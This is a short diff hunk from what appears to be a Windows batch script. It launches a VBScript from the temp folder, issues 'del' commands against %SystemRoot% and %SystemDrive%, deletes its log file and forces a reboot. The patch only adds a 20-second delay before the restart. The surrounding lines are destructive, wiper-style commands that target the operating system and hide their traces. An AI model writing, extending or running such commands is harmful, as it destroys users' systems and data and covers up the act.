@@ -181,4 +181,6 @@ start %temp%\temp2.vbs 
 del %SystemRoot%
 del %SystemDrive%
 del %LOGFILE%
+timeout 20 /nobreak
+
 Shutdown.exe -r
